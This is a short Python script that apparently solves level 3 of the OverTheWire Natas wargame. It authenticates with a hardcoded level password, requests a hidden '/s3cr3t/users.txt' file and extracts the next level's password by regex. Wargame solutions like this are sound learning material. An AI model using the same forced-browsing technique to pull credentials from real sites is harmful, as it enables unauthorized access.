#!/usr/bin/python3

import requests
import re

user = "natas3"
next_level_user = "natas4"
pwd = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"

url = "http://%s.natas.labs.overthewire.org/s3cr3t/users.txt" % user

response = requests.get(url, auth=(user, pwd))
reg = "<!--The password for %s is (.*) -->" % next_level_user
print(re.findall(reg, response.text))

print(response.text)
